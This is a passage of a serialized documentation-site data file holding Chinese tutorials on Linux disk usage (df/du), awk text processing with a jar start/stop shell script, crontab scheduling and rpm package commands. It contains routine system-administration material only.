是树形文件系统，目录属于哪个磁盘分区取决于挂载磁盘时的挂载点，所以要想知道目录在哪个分区，就要借助显示磁版盘信息（特别能显示挂载点）的命令。df 命令是显示磁盘容量的，但是以目录作为参数，可以显示目录所在磁盘的信息。所以这个笨办法也算是个好办法吧。",normalizedContent:"df 命令是 linux 系统以磁盘分区为单位查看文件系统，可以加上参数查看磁盘剩余空间信息，命令格式位 df -h ，显示内容如下：\n\nfilesystem   size   used   avail   use%   mounted on\n文件系统         容量     可用     use%    已用 %   挂载点\n/dev/hda2    45g    19g    24g     44%    /\n/dev/hda1    494m   19m    450m    4%     /boot\n\n查看磁盘剩余空间 df -hl\n\n[root@localhost /]# df -hl\nfilesystem               size  used avail use% mounted on\ndevtmpfs                 1.9g     0  1.9g   0% /dev\ntmpfs                    1.9g     0  1.9g   0% /dev/shm\ntmpfs                    1.9g   29m  1.9g   2% /run\ntmpfs                    1.9g     0  1.9g   0% /sys/fs/cgroup\n/dev/mapper/centos-root   47g   16g   32g  34% /\n/dev/sda1               1014m  326m  689m  33% /boot\ntmpfs                    378m  8.0k  378m   1% /run/user/42\ntmpfs                    378m   32k  378m   1% /run/user/1000\n/dev/sr0                 4.3g  4.3g     0 100% /run/media/fengqianrun/centos 7 x86_64\ntmpfs                    378m     0  378m   0% /run/user/0\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\n查看每个根路径的分区大小 df -h\n\n[root@localhost /]# df -h\nfilesystem               size  used avail use% mounted on\ndevtmpfs                 1.9g     0  1.9g   0% /dev\ntmpfs                    1.9g     0  1.9g   0% /dev/shm\ntmpfs                    1.9g   29m  1.9g   2% /run\ntmpfs                    1.9g     0  1.9g   0% /sys/fs/cgroup\n/dev/mapper/centos-root   47g   16g   32g  34% /\n/dev/sda1               1014m  326m  689m  33% /boot\ntmpfs                    378m  8.0k  378m   1% /run/user/42\ntmpfs                    378m   32k  378m   1% /run/user/1000\n/dev/sr0                 4.3g  4.3g     0 100% /run/media/fengqianrun/centos 7 x86_64\ntmpfs                    378m     0  378m   0% /run/user/0\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\n返回该目录的大小 du -sh [目录名]\n\n[root@localhost /]# du -sh /root\n803m    /root\n\n\n1\n2\n\n\n返回该文件夹总 m 数 du -sm [文件夹]\n\n[root@localhost /]# du -sm /root\n803     /root\n\n\n1\n2\n\n\n查看指定文件夹下的所有文件大小（包含子文件夹) du -h [目录名]\n\n[root@localhost /]# du -h /root\n12k     /root/redis-6.0.5/utils/hyperloglog\n20k     /root/redis-6.0.5/utils/lru\n20k     /root/redis-6.0.5/utils/releasetools\n12k     /root/redis-6.0.5/utils/srandmember\n164k    /root/redis-6.0.5/utils\n71m     /root/redis-6.0.5\n803m    /root\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\n产看文件属于哪个磁盘 df -h [目录]\n\n//没有挂载磁盘的目录，显示在系统盘\n[root@iz2ze57v3n0zma46zqiq8nz sh-1.5.5]# df -h /alidata/\nfilesystem      size  used avail use% mounted on\n/dev/vda1        40g  4.6g   33g  13% /\n\n\n1\n2\n3\n4\n\n\n//挂载了磁盘的目录，显示在数据盘分区vdb1\n[root@iz2ze57v3n0zma46zqiq8nz sh-1.5.5]# df -h /mnt/\nfilesystem      size  used avail use% mounted on\n/dev/vdb1        20g   45m   19g   1% /mnt\n\n\n1\n2\n3\n4\n\n\n在显示结果中的 filesystem 和 mounted on，这两列就是这个目录所属的磁盘分区。\n因为 linux 是树形文件系统，目录属于哪个磁盘分区取决于挂载磁盘时的挂载点，所以要想知道目录在哪个分区，就要借助显示磁版盘信息（特别能显示挂载点）的命令。df 命令是显示磁盘容量的，但是以目录作为参数，可以显示目录所在磁盘的信息。所以这个笨办法也算是个好办法吧。",charsets:{cjk:!0}},{title:"Linux 文本数据处理工具awk命令",frontmatter:{title:"Linux 文本数据处理工具awk命令",date:"2023-06-25T09:22:36.000Z",permalink:"/linux/2302",sidebar:!0,article:!1,comment:!1,editLink:!1},regularPath:"/01.%E8%BF%90%E7%BB%B4/2300.linux/2302.Linux%20%E6%96%87%E6%9C%AC%E6%95%B0%E6%8D%AE%E5%A4%84%E7%90%86%E5%B7%A5%E5%85%B7awk%E5%91%BD%E4%BB%A4.html",relativePath:"01.运维/2300.linux/2302.Linux 文本数据处理工具awk命令.md",key:"v-1308af9d",path:"/linux/2302/",headers:[{level:2,title:"F（指定字段分隔符）",slug:"f-指定字段分隔符",normalizedTitle:"f（指定字段分隔符）",charIndex:79},{level:2,title:"FS（字段分隔符）",slug:"fs-字段分隔符",normalizedTitle:"fs（字段分隔符）",charIndex:368},{level:2,title:"NF（当前行的字段个数）",slug:"nf-当前行的字段个数",normalizedTitle:"nf（当前行的字段个数）",charIndex:683},{level:2,title:"NR (当前处理的是第几行)",slug:"nr-当前处理的是第几行",normalizedTitle:"nr (当前处理的是第几行)",charIndex:900},{level:2,title:"FILENAME(当前文件名)",slug:"filename-当前文件名",normalizedTitle:"filename (当前文件名)",charIndex:1458},{level:2,title:"其他变量",slug:"其他变量",normalizedTitle:"其他变量",charIndex:1794},{level:2,title:"print 和 printf",slug:"print-和-printf",normalizedTitle:"print 和 printf",charIndex:1911},{level:2,title:"其他函数",slug:"其他函数",normalizedTitle:"其他函数",charIndex:2139},{level:2,title:"条件",slug:"条件",normalizedTitle:"条件",charIndex:2690},{level:2,title:"demo",slug:"demo",normalizedTitle:"demo",charIndex:3964}],lastUpdated:"12/22/2023, 11:52:48 AM",lastUpdatedTimestamp:1703217168e3,headersStr:"F（指定字段分隔符） FS（字段分隔符） NF（当前行的字段个数） NR (当前处理的是第几行) FILENAME(当前文件名) 其他变量 print 和 printf 其他函数 条件 demo",content:'awk 命令是逐行扫描文件（从第 1 行到最后一行），寻找含有目标文本的行，如果匹配成功，则会在该行上执行用户想要的操作；反之，则不对行做任何处理。\n\n\n# F（指定字段分隔符）\n\n默认使用空格作为分隔符。\n\n[root@localhost awk]# echo "aa bb  cc dd  ee ff" | awk  \'{print $1}\'\naa\n[root@localhost awk]# echo "aa bb l cc dd l ee ff" | awk -F \'l\' \'{print $1}\'\naa bb \n[root@localhost awk]# echo "aa bb  cc : dd  ee ff" | awk -F \':\' \'{print $1}\'\naa bb  cc \n\n\n1\n2\n3\n4\n5\n6\n\n\n\n# FS（字段分隔符）\n\n默认是空格和制表符。\n$0 表示当前整行内容，$1，$2 表示第一个字段，第二个字段\n\n[root@localhost zabbix_agentd.d]# echo "aa bb cc  dd" | awk \'{ print $0}\'\naa bb cc  dd\n[root@localhost zabbix_agentd.d]# echo "aa bb cc  dd" | awk \'{ print $1}\'\naa\n[root@localhost zabbix_agentd.d]# echo "aa bb cc  dd" | awk \'{ print $2}\'\nbb\n\n\n1\n2\n3\n4\n5\n6\n\n\n\n# NF（当前行的字段个数）\n\n就代表最后一个字段，(NF-1) 代表倒数第二个字段\n\n[root@localhost zabbix_agentd.d]# echo "aa bb cc  dd" | awk \'{ print $NF}\'\ndd\n[root@localhost zabbix_agentd.d]# echo "aa bb cc  dd" | awk \'{ print $(NF-1)}\'\ncc\n\n\n1\n2\n3\n4\n\n\n\n# NR (当前处理的是第几行)\n\n打印当前行号和当前文本内容\n\n[root@localhost awk]# cat test.txt \naa ss\ndd ff\ngg hh\n[root@localhost awk]# cat test.txt | awk \'{print NR")", $0}\'\n1) aa ss\n2) dd ff\n3) gg hh\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\n逗号表示输出的变量之间用空格分隔；\n右括号必需使用 双引号 才可以原样输出\n打印指定行内容：\n\n[root@localhost S17]# java -version \njava version "1.8.0_131"\nJava(TM) SE Runtime Environment (build 1.8.0_131-b11)\nJava HotSpot(TM) 64-Bit Server VM (build 25.131-b11, mixed mode)\n[root@localhost S17]# java -version 2>&1  | awk \'NR==1 {print $0}\'\njava version "1.8.0_131"\n[root@localhost S17]# \n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n\n# FILENAME (当前文件名)\n\n[root@localhost awk]#  awk \'{print FILENAME, NR")", $0}\' test.txt \ntest.txt 1) aa ss\ntest.txt 2) dd ff\ntest.txt 3) gg hh\n[root@localhost awk]# cat test.txt | awk \'{print FILENAME, NR")", $0}\'\n- 1) aa ss\n- 2) dd ff\n- 3) gg hh\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\nawk \'{condition action}\' filename 这种形式时可以打印文件名；\n通过 |（管道符）读取内容时打印的是 -\n\n\n# 其他变量\n\nRS：行分隔符，用于分割每一行，默认是换行符。\nOFS：输出字段的分隔符，用于打印时分隔字段，默认为空格。\nORS：输出记录的分隔符，用于打印时分隔记录，默认为换行符。\nOFMT：数字输出的格式，默认为％.6g。\n\n\n# print 和 printf\n\nawk 中同时提供了 print 和 printf 两种打印输出的函数。\n\nprint 函数，参数可以是变量、数值或者字符串。字符串必须用双引号引用，参数用逗号分隔。如果没有逗号，参数就串联在一起而无法区分。这里，逗号的作用与输出文件的分隔符的作用是一样的，只是后者是空格而已。\n\nprintf 函数，其用法和 c 语言中 printf 基本相似，可以格式化字符串，输出复杂时，printf 更加好用，代码更易懂。\n\n\n# 其他函数\n\ntoupper ()：字符转为大写。\ntolower ()：字符转为小写。\nlength ()：返回字符串长度。\nsubstr ()：返回子字符串。\nsubstr ($1,2)：返回第一个字段，从第 2 个字符开始一直到结束。\nsubstr ($1,2,3)：返回第一个字段，从第 2 个字符开始开始后的 3 个字符。\nsin ()：正弦。\ncos ()：余弦。\nsqrt ()：平方根。\nrand ()：随机数。\n\n[root@localhost awk]# echo "aa bb  cc dd  ee ff" | awk  \'{print toupper($1)}\'\nAA\n[root@localhost awk]# echo "aa BB  cc dd  ee ff" | awk  \'{print tolower($2)}\'\nbb\n[root@localhost awk]# echo "aa BB  cc dd  ee ff" | awk  \'{print length($2)}\'\n2\n[root@localhost awk]# echo "asdfghj" | awk \'{print substr($1,2,3)}\'\nsdf\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\n\n# 条件\n\nawk 允许指定输出条件，只输出符合条件的行。\nawk \' 条件 {动作}\' 文件名\n\n[root@localhost awk]# cat exp.txt \n/stsvc/fms/conf/application.yml\n/stsvc/sms/conf/application.yml\n/stsvc/tms/conf/application.yml\n/root/home/chenfan\n/root/home/jhhuang\n[root@localhost awk]# cat exp.txt | awk \'/stsvc/ {print $0}\'     包含 stsvc 的行\n/stsvc/fms/conf/application.yml\n/stsvc/sms/conf/application.yml\n/stsvc/tms/conf/application.yml\n[root@localhost awk]# cat exp.txt | awk \'/stsvc\\/fms/ {print $0}\' 包含 stsvc/fms 的行\n/stsvc/fms/conf/application.yml\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\n布尔值判断\n\n[root@localhost awk]# cat exp.txt | awk \'NR==2 {print $0}\'　　等于第二行\n/stsvc/sms/conf/application.yml\n[root@localhost awk]# cat exp.txt | awk \'NR>4 {print $0}\'　　大于第四行\n/root/home/jhhuang\n[root@localhost awk]# cat exp.txt | awk \'NR%2==1 {print $0}\'　　奇数行\n/stsvc/fms/conf/application.yml\n/stsvc/tms/conf/application.yml\n/root/home/jhhuang\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\n某个字段等于具体值\n\n[root@localhost awk]# cat test.txt \naa ss\ndd ff\ngg hh\n[root@localhost awk]# cat test.txt | awk \' $2=="ff" {print $0}\'\ndd ff\n\n\n1\n2\n3\n4\n5\n6\n\n\nif 语句\n\n[root@localhost awk]# echo "aa ss dd" | awk \'{ if($3 == "dd") print $0; else print "nothing"}\'\naa ss dd\n[root@localhost awk]# echo "aa ss dds" | awk \'{ if($3 == "dd") print $0; else print "nothing"}\'\nnothing\n\n\n1\n2\n3\n4\n\n\n\n# demo\n\n以下脚本复制粘贴就可用，需要在和应用同级目录新建一个 logs 文件夹，使用方法 ./ 脚本.sh start 应用名称.jar，其中使用了 awk 命令解决获取 pid 问题\n\n#/bin/bash\n\n# 这里说一下 我用 /bin/sh 脚本里打印非正常 换成 /bin/bash 就好了\n# 通过执行文件获得 要被执行的jar 例如 ./start.sh test-0.0.1.jar 获取到 test-0.0.1.jar\n# $@获得所有参数,$1获得第一个参数\nMATHOD=$1\nAPP_NAME=$2\n# 在方法内直接使用是无法获取到个数的\nPARAM=$#\n\n# 参数校验\ncheck(){\n    if [ $PARAM -ne 2 ]; then\n        echo "run method  $0 start | stop  app_name.jar"\n        exit\n    fi\n}\n\n\n# 判断程序是否运行 如果不存在返回1，存在返回0\nis_exist(){\n    check\n    # grep -v grep 就是查找不含有 grep 字段的行，默认第一条命令会查出两行数据，第一行一般是我们所需要的，第二行就属于 grep的数据\n    # grep 是查找含有指定文本行的意思，比如grep test 就是查找含有test的文本的行\n    # grep -v 是反向查找的意思，比如 grep -v grep 就是查找不含有 grep 字段的行\n    # $(ps -ef | grep $jarname | grep -v grep) 是执行一个命令，并把结果赋给pid\n    # awk 百度\n    pid=`ps -ef | grep $APP_NAME | grep -v grep | awk \'{print $2}\'`\n    # [ -z STRING ] “STRING” 的长度为零则为真。\n    if [ -z "$pid" ]; then\n        return 1\n    else\n        return 0\n    fi\n}\n\n#启动方法\nstart(){\n    is_exist\n    # %%-* 表示从右边开始，删除最后（最左边）的 - 号及右边的多有字符\n    LOG_NAME="${APP_NAME%%-*}.log"\n    # $? 是一个特殊变量，用来获取上一个命令的退出状态，或者上一个函数的返回值。\n    # -eq 等于\n    if [ $? -eq 0 ]; then\n        stop\n        start_app\n    else\n        start_app\n    fi\n}\n\nstart_app(){\n    echo "$APP_NAME start..."\n    # 2> 表示把标准错误(stderr)重定向，标准输出(stdout)是1 2> 后面可以跟文件名，或者是&1, &2，分别表示重定向到标准输出和标准错误。\n    nohup java -jar $APP_NAME > logs/$LOG_NAME 2>&1 &\n    # 延迟 1s 1秒 1m 1分钟 1h 1小时 1d 1天\n    sleep 1s;\n    tail -f logs/$LOG_NAME\n}\n\n\n\n# 停止运行\nstop(){\n    is_exist\n    if [ $? -eq 0 ]; then\n        echo "$APP_NAME is running "\n        kill -9 $pid\n        echo "$APP_NAME is kill ok. pid is $pid"\n    else\n        echo "${APP_NAME} is not running"\n    fi\n}\n\n# 判断参数1是否为空，为空则告诉标准写法，不为空则把参数当方法执行\nif [ ! $1 ]; then\n    echo "run method  $0 start | stop  app_name.jar"\n    exit\nelse\n    $1\nfi\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n72\n73\n74\n75\n76\n77\n78\n79\n80\n81\n82\n\n\n> 编写 shell 脚本，函数一定要在最上面，否则调用函数会报 command not found',normalizedContent:'awk 命令是逐行扫描文件（从第 1 行到最后一行），寻找含有目标文本的行，如果匹配成功，则会在该行上执行用户想要的操作；反之，则不对行做任何处理。\n\n\n# f（指定字段分隔符）\n\n默认使用空格作为分隔符。\n\n[root@localhost awk]# echo "aa bb  cc dd  ee ff" | awk  \'{print $1}\'\naa\n[root@localhost awk]# echo "aa bb l cc dd l ee ff" | awk -f \'l\' \'{print $1}\'\naa bb \n[root@localhost awk]# echo "aa bb  cc : dd  ee ff" | awk -f \':\' \'{print $1}\'\naa bb  cc \n\n\n1\n2\n3\n4\n5\n6\n\n\n\n# fs（字段分隔符）\n\n默认是空格和制表符。\n$0 表示当前整行内容，$1，$2 表示第一个字段，第二个字段\n\n[root@localhost zabbix_agentd.d]# echo "aa bb cc  dd" | awk \'{ print $0}\'\naa bb cc  dd\n[root@localhost zabbix_agentd.d]# echo "aa bb cc  dd" | awk \'{ print $1}\'\naa\n[root@localhost zabbix_agentd.d]# echo "aa bb cc  dd" | awk \'{ print $2}\'\nbb\n\n\n1\n2\n3\n4\n5\n6\n\n\n\n# nf（当前行的字段个数）\n\n就代表最后一个字段，(nf-1) 代表倒数第二个字段\n\n[root@localhost zabbix_agentd.d]# echo "aa bb cc  dd" | awk \'{ print $nf}\'\ndd\n[root@localhost zabbix_agentd.d]# echo "aa bb cc  dd" | awk \'{ print $(nf-1)}\'\ncc\n\n\n1\n2\n3\n4\n\n\n\n# nr (当前处理的是第几行)\n\n打印当前行号和当前文本内容\n\n[root@localhost awk]# cat test.txt \naa ss\ndd ff\ngg hh\n[root@localhost awk]# cat test.txt | awk \'{print nr")", $0}\'\n1) aa ss\n2) dd ff\n3) gg hh\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\n逗号表示输出的变量之间用空格分隔；\n右括号必需使用 双引号 才可以原样输出\n打印指定行内容：\n\n[root@localhost s17]# java -version \njava version "1.8.0_131"\njava(tm) se runtime environment (build 1.8.0_131-b11)\njava hotspot(tm) 64-bit server vm (build 25.131-b11, mixed mode)\n[root@localhost s17]# java -version 2>&1  | awk \'nr==1 {print $0}\'\njava version "1.8.0_131"\n[root@localhost s17]# \n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n\n# filename (当前文件名)\n\n[root@localhost awk]#  awk \'{print filename, nr")", $0}\' test.txt \ntest.txt 1) aa ss\ntest.txt 2) dd ff\ntest.txt 3) gg hh\n[root@localhost awk]# cat test.txt | awk \'{print filename, nr")", $0}\'\n- 1) aa ss\n- 2) dd ff\n- 3) gg hh\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\nawk \'{condition action}\' filename 这种形式时可以打印文件名；\n通过 |（管道符）读取内容时打印的是 -\n\n\n# 其他变量\n\nrs：行分隔符，用于分割每一行，默认是换行符。\nofs：输出字段的分隔符，用于打印时分隔字段，默认为空格。\nors：输出记录的分隔符，用于打印时分隔记录，默认为换行符。\nofmt：数字输出的格式，默认为％.6g。\n\n\n# print 和 printf\n\nawk 中同时提供了 print 和 printf 两种打印输出的函数。\n\nprint 函数，参数可以是变量、数值或者字符串。字符串必须用双引号引用，参数用逗号分隔。如果没有逗号，参数就串联在一起而无法区分。这里，逗号的作用与输出文件的分隔符的作用是一样的，只是后者是空格而已。\n\nprintf 函数，其用法和 c 语言中 printf 基本相似，可以格式化字符串，输出复杂时，printf 更加好用，代码更易懂。\n\n\n# 其他函数\n\ntoupper ()：字符转为大写。\ntolower ()：字符转为小写。\nlength ()：返回字符串长度。\nsubstr ()：返回子字符串。\nsubstr ($1,2)：返回第一个字段，从第 2 个字符开始一直到结束。\nsubstr ($1,2,3)：返回第一个字段，从第 2 个字符开始开始后的 3 个字符。\nsin ()：正弦。\ncos ()：余弦。\nsqrt ()：平方根。\nrand ()：随机数。\n\n[root@localhost awk]# echo "aa bb  cc dd  ee ff" | awk  \'{print toupper($1)}\'\naa\n[root@localhost awk]# echo "aa bb  cc dd  ee ff" | awk  \'{print tolower($2)}\'\nbb\n[root@localhost awk]# echo "aa bb  cc dd  ee ff" | awk  \'{print length($2)}\'\n2\n[root@localhost awk]# echo "asdfghj" | awk \'{print substr($1,2,3)}\'\nsdf\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\n\n# 条件\n\nawk 允许指定输出条件，只输出符合条件的行。\nawk \' 条件 {动作}\' 文件名\n\n[root@localhost awk]# cat exp.txt \n/stsvc/fms/conf/application.yml\n/stsvc/sms/conf/application.yml\n/stsvc/tms/conf/application.yml\n/root/home/chenfan\n/root/home/jhhuang\n[root@localhost awk]# cat exp.txt | awk \'/stsvc/ {print $0}\'     包含 stsvc 的行\n/stsvc/fms/conf/application.yml\n/stsvc/sms/conf/application.yml\n/stsvc/tms/conf/application.yml\n[root@localhost awk]# cat exp.txt | awk \'/stsvc\\/fms/ {print $0}\' 包含 stsvc/fms 的行\n/stsvc/fms/conf/application.yml\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\n布尔值判断\n\n[root@localhost awk]# cat exp.txt | awk \'nr==2 {print $0}\'　　等于第二行\n/stsvc/sms/conf/application.yml\n[root@localhost awk]# cat exp.txt | awk \'nr>4 {print $0}\'　　大于第四行\n/root/home/jhhuang\n[root@localhost awk]# cat exp.txt | awk \'nr%2==1 {print $0}\'　　奇数行\n/stsvc/fms/conf/application.yml\n/stsvc/tms/conf/application.yml\n/root/home/jhhuang\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\n某个字段等于具体值\n\n[root@localhost awk]# cat test.txt \naa ss\ndd ff\ngg hh\n[root@localhost awk]# cat test.txt | awk \' $2=="ff" {print $0}\'\ndd ff\n\n\n1\n2\n3\n4\n5\n6\n\n\nif 语句\n\n[root@localhost awk]# echo "aa ss dd" | awk \'{ if($3 == "dd") print $0; else print "nothing"}\'\naa ss dd\n[root@localhost awk]# echo "aa ss dds" | awk \'{ if($3 == "dd") print $0; else print "nothing"}\'\nnothing\n\n\n1\n2\n3\n4\n\n\n\n# demo\n\n以下脚本复制粘贴就可用，需要在和应用同级目录新建一个 logs 文件夹，使用方法 ./ 脚本.sh start 应用名称.jar，其中使用了 awk 命令解决获取 pid 问题\n\n#/bin/bash\n\n# 这里说一下 我用 /bin/sh 脚本里打印非正常 换成 /bin/bash 就好了\n# 通过执行文件获得 要被执行的jar 例如 ./start.sh test-0.0.1.jar 获取到 test-0.0.1.jar\n# $@获得所有参数,$1获得第一个参数\nmathod=$1\napp_name=$2\n# 在方法内直接使用是无法获取到个数的\nparam=$#\n\n# 参数校验\ncheck(){\n    if [ $param -ne 2 ]; then\n        echo "run method  $0 start | stop  app_name.jar"\n        exit\n    fi\n}\n\n\n# 判断程序是否运行 如果不存在返回1，存在返回0\nis_exist(){\n    check\n    # grep -v grep 就是查找不含有 grep 字段的行，默认第一条命令会查出两行数据，第一行一般是我们所需要的，第二行就属于 grep的数据\n    # grep 是查找含有指定文本行的意思，比如grep test 就是查找含有test的文本的行\n    # grep -v 是反向查找的意思，比如 grep -v grep 就是查找不含有 grep 字段的行\n    # $(ps -ef | grep $jarname | grep -v grep) 是执行一个命令，并把结果赋给pid\n    # awk 百度\n    pid=`ps -ef | grep $app_name | grep -v grep | awk \'{print $2}\'`\n    # [ -z string ] “string” 的长度为零则为真。\n    if [ -z "$pid" ]; then\n        return 1\n    else\n        return 0\n    fi\n}\n\n#启动方法\nstart(){\n    is_exist\n    # %%-* 表示从右边开始，删除最后（最左边）的 - 号及右边的多有字符\n    log_name="${app_name%%-*}.log"\n    # $? 是一个特殊变量，用来获取上一个命令的退出状态，或者上一个函数的返回值。\n    # -eq 等于\n    if [ $? -eq 0 ]; then\n        stop\n        start_app\n    else\n        start_app\n    fi\n}\n\nstart_app(){\n    echo "$app_name start..."\n    # 2> 表示把标准错误(stderr)重定向，标准输出(stdout)是1 2> 后面可以跟文件名，或者是&1, &2，分别表示重定向到标准输出和标准错误。\n    nohup java -jar $app_name > logs/$log_name 2>&1 &\n    # 延迟 1s 1秒 1m 1分钟 1h 1小时 1d 1天\n    sleep 1s;\n    tail -f logs/$log_name\n}\n\n\n\n# 停止运行\nstop(){\n    is_exist\n    if [ $? -eq 0 ]; then\n        echo "$app_name is running "\n        kill -9 $pid\n        echo "$app_name is kill ok. pid is $pid"\n    else\n        echo "${app_name} is not running"\n    fi\n}\n\n# 判断参数1是否为空，为空则告诉标准写法，不为空则把参数当方法执行\nif [ ! $1 ]; then\n    echo "run method  $0 start | stop  app_name.jar"\n    exit\nelse\n    $1\nfi\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n72\n73\n74\n75\n76\n77\n78\n79\n80\n81\n82\n\n\n> 编写 shell 脚本，函数一定要在最上面，否则调用函数会报 command not found',charsets:{cjk:!0}},{title:"Linux 定时任务",frontmatter:{title:"Linux 定时任务",date:"2023-06-25T09:22:36.000Z",permalink:"/linux/2303",sidebar:!0,article:!1,comment:!1,editLink:!1},regularPath:"/01.%E8%BF%90%E7%BB%B4/2300.linux/2303.Linux%20%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1.html",relativePath:"01.运维/2300.linux/2303.Linux 定时任务.md",key:"v-252f5a65",path:"/linux/2303/",lastUpdated:"12/22/2023, 11:52:48 AM",lastUpdatedTimestamp:1703217168e3,headersStr:null,content:"crontab 命令 被用来提交和管理用户的需要周期性执行的任务，与 windows 下的计划任务类似，当安装完成操作系统后，默认会安装此服务工具，并且会自动启动 crond 进程，crond 进程每分钟会定期检查是否有要执行的任务，如果有要执行的任务，则自动执行该任务。\n\ncrontab -e : 修改 crontab 文件. 如果文件不存在会自动创建。 \ncrontab -l : 显示 crontab 文件。 \ncrontab -r : 删除 crontab 文件。\ncrontab -ir : 删除 crontab 文件前提醒用户。\n\n\n1\n2\n3\n4\n\n\n{minute} {hour} {day-of-month} {month} {day-of-week} {full-path-to-shell-script} \no minute: 区间为 0 – 59 \no hour: 区间为0 – 23 \no day-of-month: 区间为0 – 31 \no month: 区间为1 – 12. 1 是1月. 12是12月. \no Day-of-week: 区间为0 – 7. 周日可以是0或7.\n\n1、在 凌晨00:01运行\n1 0 * * * /home/linrui/XXXX.sh\n2、每个工作日23:59都进行备份作业。\n59 11 * * 1-5 /home/linrui/XXXX.sh\n3、每分钟运行一次命令\n*/1 * * * * /home/linrui/XXXX.sh\n4、每个月的1号 14:10 运行\n10 14 1 * * /home/linrui/XXXX.sh\n\n星号（*）：代表所有可能的值，例如month字段如果是星号，则表示在满足其它字段的制约条件后每月都执行该命令操作。\n 逗号（,）：可以用逗号隔开的值指定一个列表范围，例如，“1,2,5,7,8,9”\n中杠（-）：可以用整数之间的中杠表示一个整数范围，例如“2-6”表示“2,3,4,5,6”\n正斜线（/）：可以用正斜线指定时间的间隔频率，例如“0-23/2”表示每两小时执行一次。\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n\n\n也可以进入 vim /etc/crontab (Linux 系统中用于配置 cron 任务的文件) 直接操作文件",normalizedContent:"crontab 命令 被用来提交和管理用户的需要周期性执行的任务，与 windows 下的计划任务类似，当安装完成操作系统后，默认会安装此服务工具，并且会自动启动 crond 进程，crond 进程每分钟会定期检查是否有要执行的任务，如果有要执行的任务，则自动执行该任务。\n\ncrontab -e : 修改 crontab 文件. 如果文件不存在会自动创建。 \ncrontab -l : 显示 crontab 文件。 \ncrontab -r : 删除 crontab 文件。\ncrontab -ir : 删除 crontab 文件前提醒用户。\n\n\n1\n2\n3\n4\n\n\n{minute} {hour} {day-of-month} {month} {day-of-week} {full-path-to-shell-script} \no minute: 区间为 0 – 59 \no hour: 区间为0 – 23 \no day-of-month: 区间为0 – 31 \no month: 区间为1 – 12. 1 是1月. 12是12月. \no day-of-week: 区间为0 – 7. 周日可以是0或7.\n\n1、在 凌晨00:01运行\n1 0 * * * /home/linrui/xxxx.sh\n2、每个工作日23:59都进行备份作业。\n59 11 * * 1-5 /home/linrui/xxxx.sh\n3、每分钟运行一次命令\n*/1 * * * * /home/linrui/xxxx.sh\n4、每个月的1号 14:10 运行\n10 14 1 * * /home/linrui/xxxx.sh\n\n星号（*）：代表所有可能的值，例如month字段如果是星号，则表示在满足其它字段的制约条件后每月都执行该命令操作。\n 逗号（,）：可以用逗号隔开的值指定一个列表范围，例如，“1,2,5,7,8,9”\n中杠（-）：可以用整数之间的中杠表示一个整数范围，例如“2-6”表示“2,3,4,5,6”\n正斜线（/）：可以用正斜线指定时间的间隔频率，例如“0-23/2”表示每两小时执行一次。\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n\n\n也可以进入 vim /etc/crontab (linux 系统中用于配置 cron 任务的文件) 直接操作文件",charsets:{cjk:!0}},{title:"Linux 命令总结",frontmatter:{title:"Linux 命令总结",date:"2023-06-25T09:22:36.000Z",permalink:"/linux/2304",sidebar:!0,article:!1,comment:!1,editLink:!1},regularPath:"/01.%E8%BF%90%E7%BB%B4/2300.linux/2304.Linux%20%E5%91%BD%E4%BB%A4%E6%80%BB%E7%BB%93.html",relativePath:"01.运维/2300.linux/2304.Linux 命令总结.md",key:"v-8da11b2c",path:"/linux/2304/",headers:[{level:2,title:"rpm",slug:"rpm",normalizedTitle:"rpm",charIndex:2},{level:2,title:"firewall",slug:"firewall",normalizedTitle:"firewall",charIndex:330}],lastUpdated:"12/22/2023, 11:52:48 AM",lastUpdatedTimestamp:1703217168e3,headersStr:"rpm firewall",content:'# rpm\n\n在 Linux 系统中，RPM（Red Hat Package Manager）是一种常见的软件包管理器，提供了方便的软件安装、升级和卸载功能。本文将详细介绍 rpm 的语法、实操和各种方法之间的区别及重点内容。\n\n# 安装\nrpm -ivh xxx.rpm\n\n# 可以查询到rpm包的名字\nrpm -q <关键字>\n\n# 删除特定rpm包\nrpm -e <包的名字>\n\n# 不检查依赖，直接删除rpm包\nrpm -e --nodeps <包的名字>\n\n# 删除所有相同名字的包， 并忽略依赖\nrpm -e --allmatches --nodeps <包的名字>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n\n\n\n# firewall\n\nfirewall 是 CentOS 7 版本后的自带防火墙管理工具，与 iptables 不同，firewall 是一款动态防火墙管理工具。所谓动态防火墙，是指 firewall 